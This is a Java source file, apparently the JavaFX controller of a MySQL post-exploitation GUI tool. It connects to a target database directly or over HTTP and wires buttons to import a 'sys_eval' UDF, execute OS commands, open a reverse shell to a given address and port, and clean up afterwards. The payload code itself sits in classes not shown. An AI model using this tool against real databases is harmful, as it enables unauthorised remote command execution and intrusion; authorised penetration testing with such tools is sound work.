package Controller;

import Dao.MysqlDao;
import Dao.MysqlHttpDao;
import Entity.ControllersFactory;
import Util.Utils;
import Util.MessageUtil;
import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.fxml.Initializable;
import javafx.scene.control.Button;
import javafx.scene.control.ComboBox;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import org.json.JSONObject;


import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.ResourceBundle;

/**
 * @author ch1ng
 */
public class MysqlController implements Initializable {


    @FXML
    private ComboBox<String> MysqlEncode;

    @FXML
    private Button mysqlntfs;

    @FXML
    private TextField reverseAddressTextField;

    @FXML
    private TextField reversePortTextField;

    @FXML
    private Button mysqlclean;

    @FXML
    private TextArea mysqloutput;

    @FXML
    private TextField mysqlcommand;

    @FXML
    private Button mysqleval;

    @FXML
    private Button mysqludf;

    @FXML
    public TextArea mysqlLogTextArea;

    /**
     * 存储从 MysqlDao 传递过来的 mysqlDao 使用
     */
    private MysqlDao mysqlDao;

    private MysqlHttpDao mysqlHttpDao;

    private JSONObject dataObj;

    private List workList = new ArrayList();

    public List getWorkList() {
        return this.workList;
    }


    /**
     * 初始化连接，赋予全局变量 mysqlDao
     *
     * @param dbObj
     */
    public void initMysqlDao(JSONObject dbObj) {
        this.dataObj = dbObj;
        mysqlLogTextArea.appendText(Utils.log("正在连接..."));
    }

    @Override
    public void initialize(URL location, ResourceBundle resources) {
        // 初始化下拉框
        initComboBox();
        // 初始化当前 controllers 。方便其他 controllers 调用
        ControllersFactory.controllers.put(this.getClass().getSimpleName(), this);
        // 尝试连接
        Runnable runner = () -> {
            try {
                if("false".equals(this.dataObj.getString("ishttp"))){
                    this.mysqlDao = new MysqlDao(this.dataObj.getString("ipaddress"), this.dataObj.getString("port"),
                            this.dataObj.getString("database"), this.dataObj.getString("username"), this.dataObj.getString("password"), this.dataObj.getString("timeout"));
                    this.mysqlDao.getConnection();
                    Platform.runLater(() -> {
                        mysqlLogTextArea.appendText(Utils.log("连接成功！"));
                        // 获取信息输出
                        this.mysqlDao.getInfo();
                    });
                }else {
                    Platform.runLater(() -> {
                        this.mysqlHttpDao = new MysqlHttpDao(this.dataObj);
                        this.mysqlHttpDao.getConnection();
                        this.mysqlHttpDao.getInfo();
                    });
                }

            } catch (Exception e) {
                if("false".equals(this.dataObj.getString("ishttp"))){
                    Platform.runLater(() -> {
                        mysqlLogTextArea.appendText(Utils.log("连接失败！"));
                        MessageUtil.showExceptionMessage(e, e.getMessage());
                        try {
                            this.mysqlDao.closeConnection();
                        } catch (Exception ex) {
                        }
                    });
                }
            }
        };
        Thread workThrad = new Thread(runner);
        this.workList.add(workThrad);
        workThrad.start();
    }

    /**
     * 下拉框初始化
     */
    public void initComboBox() {
        ObservableList<String> MysqlTypeCodeoptions = FXCollections.observableArrayList(
                "UTF-8",
                "GB2312",
                "GBK"
        );
        // 初始化下拉框
        MysqlEncode.setValue("UTF-8");
        MysqlEncode.setItems(MysqlTypeCodeoptions);
    }

    @FXML
    void mysqludf(ActionEvent event) {
        Runnable runner = () -> {
            if("false".equals(this.dataObj.getString("ishttp"))){
                this.mysqlDao.udf("sys_eval");
            }else {
                Platform.runLater(() -> {
                    this.mysqlHttpDao.importUDF("sys_eval");
                });
            }
        };
        Thread workThrad = new Thread(runner);
        workThrad.start();


    }

    @FXML
    void reverseRun(ActionEvent event) {
        Runnable runner = () -> {
            String reverseAddress = reverseAddressTextField.getText();
            String reversePort = reversePortTextField.getText();
            if("false".equals(this.dataObj.getString("ishttp"))){
                this.mysqlDao.reverseShell(reverseAddress, reversePort, "UTF-8");

            }else {
                this.mysqlHttpDao.reverseShell(reverseAddress, reversePort, "UTF-8");
            }
        };
        Thread workThrad = new Thread(runner);
        workThrad.start();

    }

    @FXML
    void mysqlntfs(ActionEvent event) {
        Runnable runner = () -> {
            if("false".equals(this.dataObj.getString("ishttp"))){
                this.mysqlDao.ntfsdir();
            }else {
                this.mysqlHttpDao.ntfsdir();
            }
        };
        Thread workThrad = new Thread(runner);
        workThrad.start();


    }

    @FXML
    void mysqlclean(ActionEvent event) {
        Runnable runner = () -> {
            if("false".equals(this.dataObj.getString("ishttp"))){
                this.mysqlDao.cleanudf();
            }else {
                this.mysqlHttpDao.cleanudf();
            }
        };
        Thread workThrad = new Thread(runner);
        workThrad.start();


    }

    @FXML
    void mysqleval(ActionEvent event) {
        Runnable runner = () -> {
            String command = mysqlcommand.getText();
            String code = MysqlEncode.getValue();
            String res = "";
            if (code == null) {
                MessageUtil.showErrorMessage( "请选择编码类型");
                return;
            }else if(command == null){
                MessageUtil.showErrorMessage( "请填写执行命令");
                return;
            }
            if("false".equals(this.dataObj.getString("ishttp"))){
                res = this.mysqlDao.eval(command, code);
            }else {
                res = this.mysqlHttpDao.eval(command, code);
            }
            mysqloutput.setText(res);
        };
        Thread workThrad = new Thread(runner);
        workThrad.start();

    }
}
